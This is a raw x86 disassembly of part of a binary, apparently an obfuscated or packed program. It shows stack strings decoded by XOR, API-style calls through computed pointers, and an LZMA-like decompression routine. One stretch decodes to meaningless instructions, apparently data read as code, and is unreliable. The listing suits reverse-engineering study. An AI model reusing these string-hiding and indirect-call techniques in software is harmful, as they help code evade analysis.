  425353:	mov    BYTE PTR [ebp-0x13],0x83
  425357:	mov    BYTE PTR [ebp-0x20],0x8
  42535b:	mov    BYTE PTR [ebp-0x1f],0xe
  42535f:	mov    BYTE PTR [ebp-0x1e],0x18
  425363:	mov    BYTE PTR [ebp-0x1d],0xd
  425367:	mov    BYTE PTR [ebp-0x1c],0x4e
  42536b:	mov    BYTE PTR [ebp-0x1b],0x4d
  42536f:	mov    BYTE PTR [ebp-0x1a],0x83
  425373:	mov    BYTE PTR [ebp-0x28],0xe
  425377:	mov    BYTE PTR [ebp-0x27],0x1b
  42537b:	mov    BYTE PTR [ebp-0x26],0x17
  42537f:	mov    BYTE PTR [ebp-0x25],0xa
  425383:	mov    BYTE PTR [ebp-0x24],0x1c
  425387:	mov    BYTE PTR [ebp-0x23],0x13
  42538b:	mov    BYTE PTR [ebp-0x22],0x14
  42538f:	mov    BYTE PTR [ebp-0x21],0x83
  425393:	xor    ecx,ecx
  425395:	lea    eax,[ebp+ecx*1-0x18]
  425399:	movzx  edx,BYTE PTR [eax]
  42539c:	xor    edx,0x7c
  42539f:	inc    edx
  4253a0:	inc    ecx
  4253a1:	mov    BYTE PTR [eax],dl
  4253a3:	cmp    ecx,0x6
  4253a6:	jb     0x425395
  4253a8:	xor    ecx,ecx
  4253aa:	lea    eax,[ebp+ecx*1-0x20]
  4253ae:	movzx  edx,BYTE PTR [eax]
  4253b1:	xor    edx,0x7c
  4253b4:	inc    edx
  4253b5:	inc    ecx
  4253b6:	mov    BYTE PTR [eax],dl
  4253b8:	cmp    ecx,0x7
  4253bb:	jb     0x4253aa
  4253bd:	xor    ecx,ecx
  4253bf:	lea    eax,[ebp+ecx*1-0x28]
  4253c3:	movzx  edx,BYTE PTR [eax]
  4253c6:	xor    edx,0x7c
  4253c9:	inc    edx
  4253ca:	inc    ecx
  4253cb:	mov    BYTE PTR [eax],dl
  4253cd:	cmp    ecx,0x8
  4253d0:	jb     0x4253bf
  4253d2:	lea    eax,[ebp-0x2c]
  4253d5:	mov    DWORD PTR [ebp-0x8],eax
  4253d8:	mov    ecx,DWORD PTR [ebp-0x8]
  4253db:	mov    eax,0x7113fccf
  4253e0:	mov    DWORD PTR [ecx],eax
  4253e2:	mov    ecx,DWORD PTR [ebp-0x2c]
  4253e5:	push   esi
  4253e6:	push   edi
  4253e7:	mov    esi,0x4e3e
  4253ec:	mov    ebx,0x3272f1
  4253f1:	cmp    ecx,eax
  4253f3:	jne    0x4254be
  4253f9:	lea    eax,[esi+0x39]
  4253fc:	mov    WORD PTR [ebp-0x78],ax
  425400:	mov    eax,esi
  425402:	mov    WORD PTR [ebp-0x76],ax
  425406:	add    eax,0x33
  425409:	mov    WORD PTR [ebp-0x74],ax
  42540d:	lea    eax,[esi-0xe]
  425410:	mov    WORD PTR [ebp-0x72],ax
  425414:	add    eax,0x4f
  425417:	mov    ecx,eax
  425419:	lea    eax,[esi-0x15]
  42541c:	mov    WORD PTR [ebp-0x66],ax
  425420:	mov    eax,esi
  425422:	mov    WORD PTR [ebp-0x64],ax
  425426:	add    eax,0xffffffec
  425429:	mov    WORD PTR [ebp-0x62],ax
  42542d:	mov    eax,0x443
  425432:	mov    WORD PTR [ebp-0x60],ax
  425436:	mov    eax,0x5674
  42543b:	mov    WORD PTR [ebp-0x5e],ax
  42543f:	mov    eax,0x6114
  425444:	mov    WORD PTR [ebp-0x5c],ax
  425448:	lea    eax,[ebp-0xe0]
  42544e:	push   eax
  42544f:	mov    eax,DWORD PTR [ebp+0xc]
  425452:	mov    edi,0x75108aa
  425457:	xor    eax,edi
  425459:	add    eax,ebx
  42545b:	push   eax
  42545c:	mov    WORD PTR [ebp-0x70],cx
  425460:	lea    ecx,[esi-0xa]
  425463:	mov    edx,ecx
  425465:	lea    eax,[ebp-0x78]
  425468:	push   eax
  425469:	mov    eax,DWORD PTR [ebp-0x4]
  42546c:	mov    eax,DWORD PTR [eax+0x198]
  425472:	mov    WORD PTR [ebp-0x6e],dx
  425476:	mov    edx,0x4f8a
  42547b:	mov    WORD PTR [ebp-0x6c],dx
  42547f:	mov    DWORD PTR [ebp-0x6a],0x4e7f4e35
  425486:	mov    DWORD PTR [ebp-0x5a],0x4e34f1e6
  42548d:	mov    DWORD PTR [ebp-0xe0],0x1
  425497:	mov    DWORD PTR [ebp-0xdc],0x255
  4254a1:	push   DWORD PTR [eax]
  4254a3:	mov    eax,DWORD PTR [ebp+0x10]
  4254a6:	call   eax
  4254a8:	mov    DWORD PTR [ebp-0x8],eax
  4254ab:	mov    eax,DWORD PTR [ebp-0x8]
  4254ae:	test   eax,eax
  4254b0:	je     0x4254c3
  4254b2:	xor    DWORD PTR ds:0x76586876,0x87687666
  4254bc:	jmp    0x4254c3
  4254be:	mov    edi,0x75108aa
  4254c3:	mov    eax,DWORD PTR [ebp-0x4]
  4254c6:	mov    ecx,DWORD PTR [eax+0x18c]
  4254cc:	xor    eax,eax
  4254ce:	cmp    DWORD PTR [ecx],eax
  4254d0:	jne    0x425742
  4254d6:	mov    ecx,DWORD PTR [ebp-0x4]
  4254d9:	mov    ecx,DWORD PTR [ecx+0x17c]
  4254df:	mov    DWORD PTR [ecx],eax
  4254e1:	mov    ecx,DWORD PTR [ebp-0x4]
  4254e4:	mov    ecx,DWORD PTR [ecx+0x180]
  4254ea:	mov    DWORD PTR [ecx],eax
  4254ec:	mov    eax,0x4e61
  4254f1:	mov    WORD PTR [ebp-0x9c],ax
  4254f8:	mov    eax,esi
  4254fa:	mov    WORD PTR [ebp-0x9a],ax
  425501:	mov    eax,0x4e71
  425506:	mov    WORD PTR [ebp-0x98],ax
  42550d:	add    eax,0xffffffc0
  425510:	mov    WORD PTR [ebp-0x96],ax
  425517:	mov    eax,0x4f8e
  42551c:	mov    WORD PTR [ebp-0x94],ax
  425523:	mov    eax,0x4e32
  425528:	mov    WORD PTR [ebp-0x92],ax
  42552f:	add    eax,0x4d
  425532:	mov    WORD PTR [ebp-0x90],ax
  425539:	mov    eax,0x4e34
  42553e:	mov    WORD PTR [ebp-0x8e],ax
  425545:	mov    eax,esi
  425547:	mov    WORD PTR [ebp-0x8c],ax
  42554e:	mov    eax,0x4e35
  425553:	mov    WORD PTR [ebp-0x8a],ax
  42555a:	mov    eax,0x99f1
  42555f:	mov    WORD PTR [ebp-0x88],ax
  425566:	mov    eax,0x8d62
  42556b:	mov    WORD PTR [ebp-0x86],ax
  425572:	mov    eax,0xd66f
  425577:	mov    WORD PTR [ebp-0x84],ax
  42557e:	mov    eax,0xd783
  425583:	mov    WORD PTR [ebp-0x82],ax
  42558a:	mov    eax,0x2784
  42558f:	mov    WORD PTR [ebp-0x80],ax
  425593:	mov    eax,0x4784
  425598:	mov    WORD PTR [ebp-0x7e],ax
  42559c:	mov    eax,0x4e33
  4255a1:	push   0x8
  4255a3:	mov    WORD PTR [ebp-0x7c],ax
  4255a7:	mov    DWORD PTR [ebp-0x10],0xa171b0e
  4255ae:	mov    DWORD PTR [ebp-0xc],0x8314131c
  4255b5:	lea    eax,[ebp-0x10]
  4255b8:	pop    ecx
  4255b9:	mov    dl,BYTE PTR [eax]
  4255bb:	xor    dl,0x7c
  4255be:	inc    dl
  4255c0:	mov    BYTE PTR [eax],dl
  4255c2:	inc    eax
  4255c3:	dec    ecx
  4255c4:	jne    0x4255b9
  4255c6:	lea    eax,[ebp-0x10]
  4255c9:	mov    DWORD PTR [ebp-0xdc],eax
  4255cf:	lea    eax,[ebp-0xe0]
  4255d5:	push   eax
  4255d6:	mov    eax,DWORD PTR [ebp+0xc]
  4255d9:	xor    eax,edi
  4255db:	add    eax,ebx
  4255dd:	push   eax
  4255de:	mov    eax,DWORD PTR [ebp-0x4]
  4255e1:	add    eax,0x66
  4255e4:	push   eax
  4255e5:	mov    eax,DWORD PTR [ebp-0x4]
  4255e8:	mov    eax,DWORD PTR [eax+0x198]
  4255ee:	mov    DWORD PTR [ebp-0xe0],0x1
  4255f8:	push   DWORD PTR [eax]
  4255fa:	mov    eax,DWORD PTR [ebp+0x10]
  4255fd:	call   eax
  4255ff:	mov    ecx,DWORD PTR [ebp+0x8]
  425602:	xor    ecx,edi
  425604:	add    ecx,ebx
  425606:	mov    DWORD PTR [ebp-0x8],eax
  425609:	cmp    eax,ecx
  42560b:	jne    0x425626
  42560d:	mov    eax,ds:0x33730bcc
  425612:	or     eax,0x22150bcf
  425617:	mov    ds:0x33730bcc,eax
  42561c:	add    eax,0x3372e92f
  425621:	mov    ds:0x33730bcc,eax
  425626:	mov    ecx,0x4e66
  42562b:	mov    eax,ecx
  42562d:	mov    WORD PTR [ebp-0x40],ax
  425631:	add    eax,0x5
  425634:	mov    edx,eax
  425636:	mov    WORD PTR [ebp-0x3e],dx
  42563a:	mov    edx,0x4f93
  42563f:	mov    WORD PTR [ebp-0x3c],dx
  425643:	add    edx,0xfffffff8
  425646:	mov    WORD PTR [ebp-0x3a],dx
  42564a:	mov    edx,0x4f8d
  42564f:	mov    WORD PTR [ebp-0x38],dx
  425653:	add    edx,0xfffffff3
  425656:	mov    WORD PTR [ebp-0x36],dx
  42565a:	mov    edx,0x4f87
  42565f:	mov    WORD PTR [ebp-0x34],dx
  425663:	mov    WORD PTR [ebp-0x32],cx
  425667:	mov    ecx,esi
  425669:	mov    WORD PTR [ebp-0x30],cx
  42566d:	lea    ecx,[edx-0x1]
  425670:	mov    edx,ecx
  425672:	mov    WORD PTR [ebp-0x54],dx
  425676:	mov    edx,eax
  425678:	mov    WORD PTR [ebp-0x52],dx
  42567c:	mov    edx,0x4e73
  425681:	mov    WORD PTR [ebp-0x50],dx
  425685:	mov    WORD PTR [ebp-0x4e],ax
  425689:	lea    eax,[edx-0x6]
  42568c:	mov    WORD PTR [ebp-0x4c],ax
  425690:	add    eax,0xfffffff3
  425693:	mov    WORD PTR [ebp-0x4a],ax
  425697:	lea    eax,[edx-0xc]
  42569a:	mov    WORD PTR [ebp-0x48],ax
  42569e:	mov    WORD PTR [ebp-0x46],cx
  4256a2:	mov    WORD PTR [ebp-0x44],si
  4256a6:	mov    eax,DWORD PTR [ebp+0x8]
  4256a9:	movzx  ecx,WORD PTR [ebp-0x54]
  4256ad:	xor    eax,edi
  4256af:	add    eax,ebx
  4256b1:	xor    eax,ecx
  4256b3:	mov    WORD PTR [ebp-0x54],ax
  4256b7:	mov    eax,DWORD PTR [ebp+0x8]
  4256ba:	movzx  ecx,WORD PTR [ebp-0x40]
  4256be:	xor    eax,edi
  4256c0:	add    eax,ebx
  4256c2:	xor    eax,ecx
  4256c4:	mov    WORD PTR [ebp-0x40],ax
  4256c8:	xor    eax,eax
  4256ca:	mov    WORD PTR [ebp-0xf4],ax
  4256d1:	mov    WORD PTR [ebp-0x108],ax
  4256d8:	mov    edi,DWORD PTR [ebp+0x24]
  4256db:	lea    eax,[ebp-0xf4]
  4256e1:	lea    edx,[ebp-0x54]
  4256e4:	mov    DWORD PTR [ebp-0xe0],0x2
  4256ee:	mov    DWORD PTR [ebp-0xdc],eax
  4256f4:	call   0x42812b
  4256f9:	mov    DWORD PTR [ebp-0xd8],eax
  4256ff:	lea    eax,[ebp-0xe0]
  425705:	push   eax
  425706:	mov    eax,DWORD PTR [ebp+0xc]
  425709:	xor    eax,0x75108aa
  42570e:	add    eax,ebx
  425710:	push   eax
  425711:	lea    eax,[ebp-0x9c]
  425717:	push   eax
  425718:	push   DWORD PTR [ebp-0x8]
  42571b:	mov    eax,DWORD PTR [ebp+0x10]
  42571e:	call   eax
  425720:	mov    edi,DWORD PTR [ebp+0x24]
  425723:	lea    eax,[ebp-0x108]
  425729:	lea    edx,[ebp-0x40]
  42572c:	mov    DWORD PTR [ebp-0xdc],eax
  425732:	call   0x42812b
  425737:	mov    DWORD PTR [ebp-0xd8],eax
  42573d:	mov    edi,0x75108aa
  425742:	mov    eax,DWORD PTR [ebp+0x14]
  425745:	push   DWORD PTR [ebp-0x4]
  425748:	push   DWORD PTR [ebp+0x20]
  42574b:	push   DWORD PTR [ebp+0x1c]
  42574e:	push   DWORD PTR [ebp+0x18]
  425751:	push   DWORD PTR [ebp+0x10]
  425754:	push   DWORD PTR [ebp+0x8]
  425757:	push   DWORD PTR [ebp+0xc]
  42575a:	call   0x4269cc
  42575f:	test   eax,eax
  425761:	je     0x4257a5
  425763:	add    DWORD PTR [ebp-0x4],eax
  425766:	push   DWORD PTR [ebp-0x4]
  425769:	lea    esi,[ebp+0x4]
  42576c:	call   0x425bbd
  425771:	mov    eax,DWORD PTR [ebp-0x4]
  425774:	mov    eax,DWORD PTR [eax+0x1c8]
  42577a:	mov    eax,DWORD PTR [eax]
  42577c:	xor    eax,edi
  42577e:	add    eax,ebx
  425780:	mov    eax,DWORD PTR [ebp-0x4]
  425783:	jne    0x42579b
  425785:	mov    ecx,DWORD PTR [ebp-0x4]
  425788:	mov    ecx,DWORD PTR [ecx+0x1cc]
  42578e:	push   DWORD PTR [ecx]
  425790:	mov    eax,DWORD PTR [eax+0x1e0]
  425796:	call   DWORD PTR [eax+0x28]
  425799:	jmp    0x4257a5
  42579b:	mov    eax,DWORD PTR [eax+0x17c]
  4257a1:	mov    eax,DWORD PTR [eax]
  4257a3:	add    DWORD PTR [esi],eax
  4257a5:	mov    eax,DWORD PTR [ebp-0x4]
  4257a8:	mov    eax,DWORD PTR [eax+0x1dc]
  4257ae:	dec    DWORD PTR [eax]
  4257b0:	mov    ecx,DWORD PTR [ebp-0x4]
  4257b3:	mov    ecx,DWORD PTR [ecx+0x1d8]
  4257b9:	mov    eax,DWORD PTR [eax]
  4257bb:	lea    eax,[ecx+eax*4]
  4257be:	mov    ecx,DWORD PTR [ebp-0x4]
  4257c1:	mov    ecx,DWORD PTR [ecx+0x17c]
  4257c7:	mov    eax,DWORD PTR [eax]
  4257c9:	mov    ecx,DWORD PTR [ecx]
  4257cb:	add    DWORD PTR [eax],ecx
  4257cd:	pop    edi
  4257ce:	pop    esi
  4257cf:	pop    ebx
  4257d0:	leave  
  4257d1:	ret    0x20
  4257d4:	push   edi
  4257d5:	push   esi
  4257d6:	push   ebx
  4257d7:	push   ebp
  4257d8:	mov    ebp,esp
  4257da:	mov    eax,DWORD PTR [ebp+0x24]
  4257dd:	add    DWORD PTR [ebp+0x28],eax
  4257e0:	push   eax
  4257e1:	cld    
  4257e2:	mov    esi,DWORD PTR [ebp+0x18]
  4257e5:	add    DWORD PTR [ebp+0x1c],esi
  4257e8:	push   esi
  4257e9:	mov    esi,DWORD PTR [ebp+0x14]
  4257ec:	lods   eax,DWORD PTR ds:[esi]
  4257ed:	xchg   edx,eax
  4257ee:	push   edx
  4257ef:	mov    cl,BYTE PTR [esi-0x2]
  4257f2:	or     eax,0xffffffff
  4257f5:	shl    eax,cl
  4257f7:	not    eax
  4257f9:	push   eax
  4257fa:	mov    cl,dh
  4257fc:	or     eax,0xffffffff
  4257ff:	shl    eax,cl
  425801:	not    eax
  425803:	push   eax
  425804:	add    cl,dl
  425806:	mov    edi,esi
  425808:	sub    esp,0xc
  42580b:	sub    eax,eax
  42580d:	inc    eax
  42580e:	push   eax
  42580f:	push   eax
  425810:	push   eax
  425811:	push   eax
  425812:	push   eax
  425813:	push   edi
  425814:	sub    esi,esi
  425816:	push   esi
  425817:	or     ebx,0xffffffff
  42581a:	mov    eax,0x300
  42581f:	shl    eax,cl
  425821:	lea    ecx,[eax+0x736]
  425827:	mov    eax,0x4000400
  42582c:	shr    ecx,1
  42582e:	rep stos DWORD PTR es:[edi],eax
  425830:	push   0x5
  425832:	pop    ecx
  425833:	call   0x425b1e
  425838:	loop   0x425833
  42583a:	lea    esi,[esi]
  42583c:	lea    edi,[edi]
  42583e:	mov    edi,DWORD PTR [ebp-0x4]
  425841:	mov    eax,DWORD PTR [ebp-0x10]
  425844:	sub    edi,DWORD PTR [ebp+0x24]
  425847:	and    eax,edi
  425849:	mov    DWORD PTR [ebp-0x18],eax
  42584c:	mov    al,0x0
  42584e:	call   0x425b36
  425853:	jne    0x4258ee
  425859:	mov    cl,BYTE PTR [ebp-0xc]
  42585c:	and    edi,DWORD PTR [ebp-0x14]
  42585f:	shl    edi,cl
  425861:	sub    cl,0x8
  425864:	neg    cl
  425866:	shr    esi,cl
  425868:	pop    eax
  425869:	add    edi,esi
  42586b:	pop    esi
  42586c:	lea    edi,[edi+edi*2]
  42586f:	shl    edi,0x8
  425872:	cmp    al,0x7
  425874:	pop    edx
  425875:	lea    ecx,[esi+edi*2+0xe6c]
  42587c:	push   ecx
  42587d:	push   esi
  42587e:	mov    esi,0x100
  425883:	push   eax
  425884:	mov    al,0x1
  425886:	jb     0x4258bc
  425888:	mov    edi,DWORD PTR [ebp-0x4]
  42588b:	sub    edi,DWORD PTR [ebp-0x24]
  42588e:	movzx  edi,BYTE PTR [edi]
  425891:	mov    ebp,DWORD PTR [ebp-0x34]
  425894:	shl    edi,1
  425896:	mov    ecx,esi
  425898:	and    esi,edi
  42589a:	add    ecx,esi
  42589c:	lea    ebp,[ebp+ecx*2+0x0]
  4258a0:	call   0x425b55
  4258a5:	mov    ecx,eax
  4258a7:	shr    esi,0x8
  4258aa:	and    ecx,0x1
  4258ad:	cmp    esi,ecx
  4258af:	mov    esi,0x100
  4258b4:	jne    0x4258c4
  4258b6:	cmp    eax,esi
  4258b8:	jb     0x425891
  4258ba:	jmp    0x4258d0
  4258bc:	mov    ebp,DWORD PTR [ebp-0x34]
  4258bf:	call   0x425b55
  4258c4:	inc    eax
  4258c5:	inc    esi
  4258c6:	sub    eax,0x1
  4258c9:	sub    esi,0x1
  4258cc:	cmp    eax,esi
  4258ce:	jb     0x4258bc
  4258d0:	pop    edx
  4258d1:	inc    edx
  4258d2:	cmp    edx,0x5
  4258d5:	dec    edx
  4258d6:	mov    ecx,edx
  4258d8:	jb     0x4258e9
  4258da:	inc    edx
  4258db:	cmp    edx,0xb
  4258de:	dec    edx
  4258df:	mov    cl,0x4
  4258e1:	dec    cl
  4258e3:	jb     0x4258e9
  4258e5:	mov    cl,0x7
  4258e7:	dec    cl
  4258e9:	sub    edx,ecx
  4258eb:	push   edx
  4258ec:	jmp    0x42593d
  4258ee:	mov    al,0xc1
  4258f0:	dec    al
  4258f2:	call   0x425b46
  4258f7:	jne    0x42590d
  4258f9:	pop    eax
  4258fa:	pop    edi
  4258fb:	pop    edx
  4258fc:	pop    ecx
  4258fd:	pop    edx
  4258fe:	pop    ecx
  4258ff:	push   DWORD PTR [esp]
  425902:	push   ecx
  425903:	push   edx
  425904:	mov    edx,0x664
  425909:	mov    cl,0x0
  42590b:	jmp    0x425980
  42590d:	mov    al,0xcd
  42590f:	dec    al
  425911:	call   0x425b46
  425916:	jne    0x425946
  425918:	mov    al,0xf1
  42591a:	dec    al
  42591c:	call   0x425b36
  425921:	jne    0x425976
  425923:	pop    eax
  425924:	cmp    al,0x7
  425926:	mov    al,0x9
  425928:	jb     0x42592c
  42592a:	mov    al,0xb
  42592c:	push   eax
  42592d:	mov    esi,DWORD PTR [ebp-0x4]
  425930:	sub    esi,DWORD PTR [ebp-0x24]
  425933:	cmp    esi,DWORD PTR [ebp+0x24]
  425936:	jb     0x425b0d
  42593c:	lods   al,BYTE PTR ds:[esi]
  42593d:	mov    edi,DWORD PTR [ebp-0x4]
  425940:	stos   BYTE PTR es:[edi],al
  425941:	jmp    0x425ad4
  425946:	mov    al,0xd8
  425948:	call   0x425b46
  42594d:	mov    esi,DWORD PTR [ebp-0x28]
  425950:	je     0x42596d
  425952:	mov    al,0xe4
  425954:	call   0x425b46
  425959:	mov    esi,DWORD PTR [ebp-0x2c]
  42595c:	je     0x425967
  42595e:	mov    esi,DWORD PTR [ebp-0x30]
  425961:	mov    ecx,DWORD PTR [ebp-0x2c]
  425964:	mov    DWORD PTR [ebp-0x30],ecx
  425967:	mov    ecx,DWORD PTR [ebp-0x28]
  42596a:	mov    DWORD PTR [ebp-0x2c],ecx
  42596d:	mov    ecx,DWORD PTR [ebp-0x24]
  425970:	mov    DWORD PTR [ebp-0x28],ecx
  425973:	mov    DWORD PTR [ebp-0x24],esi
  425976:	pop    eax
  425977:	pop    edi
  425978:	pop    ecx
  425979:	mov    edx,0xa68
  42597e:	mov    cl,0x8
  425980:	add    edx,edi
  425982:	push   edx
  425983:	push   edi
  425984:	cmp    al,0x7
  425986:	mov    al,cl
  425988:	jb     0x42598c
  42598a:	add    al,0x3
  42598c:	push   eax
  42598d:	mov    ebp,DWORD PTR [ebp-0x34]
  425990:	call   0x425b53
  425995:	jne    0x4259ab
  425997:	mov    eax,DWORD PTR [ebp-0x18]
  42599a:	mov    edi,DWORD PTR [ebp-0x34]
  42599d:	shl    eax,0x3
  4259a0:	sub    ecx,ecx
  4259a2:	push   0x8
  4259a4:	pop    esi
  4259a5:	lea    edi,[edi+eax*2+0x4]
  4259a9:	jmp    0x4259e0
  4259ab:	mov    ebp,DWORD PTR [ebp-0x34]
  4259ae:	add    ebp,0x2
  4259b1:	call   0x425b53
  4259b6:	jne    0x4259d0
  4259b8:	mov    eax,DWORD PTR [ebp-0x18]
  4259bb:	mov    edi,DWORD PTR [ebp-0x34]
  4259be:	shl    eax,0x3
  4259c1:	push   0x8
  4259c3:	pop    ecx
  4259c4:	push   0x8
  4259c6:	pop    esi
  4259c7:	lea    edi,[edi+eax*2+0x104]
  4259ce:	jmp    0x4259e0
  4259d0:	mov    edi,0x204
  4259d5:	add    edi,DWORD PTR [ebp-0x34]
  4259d8:	push   0x10
  4259da:	pop    ecx
  4259db:	mov    esi,0x100
  4259e0:	mov    DWORD PTR [ebp-0x1c],ecx
  4259e3:	sub    eax,eax
  4259e5:	inc    eax
  4259e6:	mov    ebp,edi
  4259e8:	call   0x425b55
  4259ed:	mov    ecx,eax
  4259ef:	sub    ecx,esi
  4259f1:	jb     0x4259e6
  4259f3:	add    DWORD PTR [ebp-0x1c],ecx
  4259f6:	cmp    DWORD PTR [ebp-0x3c],0x4
  4259fa:	jae    0x425ab0
  425a00:	add    DWORD PTR [ebp-0x3c],0x7
  425a04:	mov    ecx,DWORD PTR [ebp-0x1c]
  425a07:	cmp    ecx,0x4
  425a0a:	jb     0x425a0f
  425a0c:	push   0x3
  425a0e:	pop    ecx
  425a0f:	mov    edi,DWORD PTR [ebp-0x38]
  425a12:	shl    ecx,0x6
  425a15:	sub    eax,eax
  425a17:	inc    eax
  425a18:	push   0x40
  425a1a:	pop    esi
  425a1b:	lea    edi,[edi+ecx*2+0x360]
  425a22:	mov    ebp,edi
  425a24:	call   0x425b55
  425a29:	mov    ecx,eax
  425a2b:	sub    ecx,esi
  425a2d:	jb     0x425a22
  425a2f:	mov    DWORD PTR [ebp-0x18],ecx
  425a32:	mov    DWORD PTR [ebp-0x24],ecx
  425a35:	cmp    ecx,0x4
  425a38:	jb     0x425aad
  425a3a:	mov    esi,ecx
  425a3c:	and    DWORD PTR [ebp-0x24],0x1
  425a40:	shr    esi,1
  425a42:	or     DWORD PTR [ebp-0x24],0x2
  425a46:	dec    esi
  425a47:	cmp    ecx,0xe
  425a4a:	jae    0x425a65
  425a4c:	mov    eax,0x2af
  425a51:	sub    eax,ecx
  425a53:	mov    ecx,esi
  425a55:	shl    BYTE PTR [ebp-0x24],cl
  425a58:	add    eax,DWORD PTR [ebp-0x24]
  425a5b:	shl    eax,1
  425a5d:	add    eax,DWORD PTR [ebp-0x38]
  425a60:	mov    DWORD PTR [ebp-0x34],eax
  425a63:	jmp    0x425a92
  425a65:	sub    esi,0x4
  425a68:	call   0x425b12
  425a6d:	shr    ebx,1
  425a6f:	shl    DWORD PTR [ebp-0x24],1
  425a72:	cmp    DWORD PTR [ebp-0x20],ebx
  425a75:	jb     0x425a7d
  425a77:	inc    DWORD PTR [ebp-0x24]
  425a7a:	sub    DWORD PTR [ebp-0x20],ebx
  425a7d:	dec    esi
  425a7e:	jne    0x425a68
  425a80:	mov    eax,0x644
  425a85:	add    eax,DWORD PTR [ebp-0x38]
  425a88:	mov    DWORD PTR [ebp-0x34],eax
  425a8b:	shl    DWORD PTR [ebp-0x24],0x4
  425a8f:	push   0x4
  425a91:	pop    esi
  425a92:	sub    edi,edi
  425a94:	inc    edi
  425a95:	mov    eax,edi
  425a97:	mov    ebp,DWORD PTR [ebp-0x34]
  425a9a:	call   0x425b55
  425a9f:	test   al,0x1
  425aa1:	je     0x425aa6
  425aa3:	or     DWORD PTR [ebp-0x24],edi
  425aa6:	shl    edi,1
  425aa8:	dec    esi
  425aa9:	jne    0x425a97
  425aab:	jmp    0x425aad
  425aad:	inc    DWORD PTR [ebp-0x24]
  425ab0:	mov    ecx,DWORD PTR [ebp-0x1c]
  425ab3:	add    ecx,0x2
  425ab6:	mov    edi,DWORD PTR [ebp-0x4]
  425ab9:	mov    eax,edi
  425abb:	sub    eax,DWORD PTR [ebp+0x24]
  425abe:	cmp    DWORD PTR [ebp-0x24],eax
  425ac1:	ja     0x425b0d
  425ac3:	mov    esi,edi
  425ac5:	sub    esi,DWORD PTR [ebp-0x24]
  425ac8:	mov    edx,DWORD PTR [ebp+0x28]
  425acb:	lods   al,BYTE PTR ds:[esi]
  425acc:	stos   BYTE PTR es:[edi],al
  425acd:	cmp    edi,edx
  425acf:	jae    0x425ad4
  425ad1:	dec    ecx
  425ad2:	jne    0x425acb
  425ad4:	mov    DWORD PTR [ebp-0x4],edi
  425ad7:	movzx  esi,al
  425ada:	cmp    edi,DWORD PTR [ebp+0x28]
  425add:	jb     0x42583e
  425ae3:	call   0x425b12
  425ae8:	sub    eax,eax
  425aea:	lea    ebp,[esp+0x3c]
  425aee:	mov    edx,DWORD PTR [ebp+0x20]
  425af1:	mov    esi,DWORD PTR [ebp-0x8]
  425af4:	sub    esi,DWORD PTR [ebp+0x18]
  425af7:	mov    DWORD PTR [edx],esi
  425af9:	mov    edx,DWORD PTR [ebp+0x2c]
  425afc:	mov    edi,DWORD PTR [ebp-0x4]
  425aff:	sub    edi,DWORD PTR [ebx+0x16]
  425b02:	lods   al,BYTE PTR ds:[esi]
  425b03:	outs   dx,BYTE PTR ds:[esi]
  425b04:	lods   eax,DWORD PTR ds:[esi]
  425b05:	repz inc DWORD PTR [ebx]
  425b08:	xchg   ecx,eax
  425b09:	test   BYTE PTR [esi-0x76cd1801],0x87
  425b10:	xor    eax,0x86758ce9
  425b15:	xchg   BYTE PTR [esi-0x6a75b076],al
  425b1b:	lea    edx,ds:0x5bb4dfa6
  425b21:	imul   esi,DWORD PTR [edx+0x5b],0xb41953f6
  425b28:	fwait
  425b29:	or     DWORD PTR [ebp-0x53c759f7],ecx
  425b2f:	fwait
  425b30:	or     DWORD PTR [ebx+ebx*2-0x4b6a0097],ebp
  425b37:	mov    ebx,0x8960c299
  425b3c:	lea    ecx,ds:0x299b9296
  425b42:	xchg   edx,eax
  425b43:	lea    esi,ds:0x8960c29e
  425b49:	xchg   edx,eax
  425b4a:	fwait
  425b4b:	cdq    
  425b4c:	mov    ah,0x3b
  425b4e:	test   eax,0x869b37bc
  425b53:	xor    cl,BYTE PTR [ecx-0x7964c844]
  425b59:	mov    WORD PTR [ebp-0x7a],?
  425b5c:	xchg   BYTE PTR [esi-0x4b09ac76],al
  425b62:	mov    bh,0x16
  425b64:	lea    dx,[edi]
  425b67:	push   ss
  425b68:	push   es
  425b69:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  425b6a:	jb     0x425b23
  425b6c:	push   ss
  425b6d:	not    DWORD PTR [ebx-0x8]
  425b70:	mov    al,0xca
  425b72:	test   DWORD PTR [edi+0x158d6616],edx
  425b78:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  425b79:	test   al,0xd7
  425b7b:	push   ss
  425b7c:	push   es
  425b7d:	mov    ah,0xb5
  425b7f:	ret    0x55b7
  425b82:	add    cl,al
  425b84:	jmp    0xcaf16a94
  425b89:	cmp    DWORD PTR [esp+0x20],ecx
  425b8d:	jae    0x425ba6
  425b8f:	mov    ebx,ecx
  425b91:	mov    ecx,0x800
  425b96:	sub    ecx,edx
  425b98:	shr    ecx,0x5
  425b9b:	add    WORD PTR [ebp+0x0],cx
  425b9f:	add    eax,eax
  425ba1:	lea    ebp,[esp+0x40]
  425ba5:	ret    
  425ba6:	shr    edx,0x5
  425ba9:	sub    DWORD PTR [esp+0x20],ecx
  425bad:	sub    ebx,ecx
  425baf:	sub    WORD PTR [ebp+0x0],dx
  425bb3:	add    eax,eax
  425bb5:	add    eax,0x1
  425bb8:	lea    ebp,[esp+0x40]
  425bbc:	ret    
  425bbd:	push   ebp
  425bbe:	mov    ebp,esp
  425bc0:	sub    esp,0x12c
  425bc6:	push   ebx
  425bc7:	push   esi
  425bc8:	push   edi
  425bc9:	mov    DWORD PTR [ebp-0x10],0xf89c85a5
  425bd0:	mov    DWORD PTR [ebp-0x18],0xf89c85ba
  425bd7:	mov    eax,DWORD PTR [ebp+0x8]
  425bda:	mov    DWORD PTR [ebp+0x8],eax
  425bdd:	mov    ecx,DWORD PTR [ebp-0x10]
  425be0:	mov    ebx,0x75108aa
  425be5:	xor    ecx,ebx
  425be7:	mov    eax,0x3272f1
  425bec:	add    ecx,eax
  425bee:	mov    DWORD PTR [ebp-0x24],ecx
  425bf1:	mov    ecx,DWORD PTR [ebp-0x10]
  425bf4:	xor    ecx,ebx
  425bf6:	add    ecx,eax
  425bf8:	mov    DWORD PTR [ebp-0x40],ecx
  425bfb:	mov    ecx,DWORD PTR [ebp-0x10]
  425bfe:	xor    ecx,ebx
  425c00:	add    ecx,eax
  425c02:	mov    DWORD PTR [ebp-0x3c],ecx
  425c05:	mov    ecx,DWORD PTR [ebp-0x10]
  425c08:	xor    ecx,ebx
  425c0a:	add    ecx,eax
  425c0c:	mov    DWORD PTR [ebp-0xd8],ecx
